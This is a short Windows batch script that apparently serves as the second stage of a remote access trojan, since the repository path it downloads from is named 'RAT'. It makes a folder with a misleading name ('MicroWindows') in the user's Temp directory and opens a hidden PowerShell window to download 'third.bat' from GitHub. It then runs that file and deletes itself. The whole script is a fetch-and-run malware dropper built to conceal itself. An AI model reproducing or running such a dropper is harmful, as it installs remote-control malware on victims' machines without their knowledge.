@echo off
set "currentd=%cd%"
set "username=saifa"

mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/third.bat


cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
powershell ./third.bat
cd %currentd%
del secondary.bat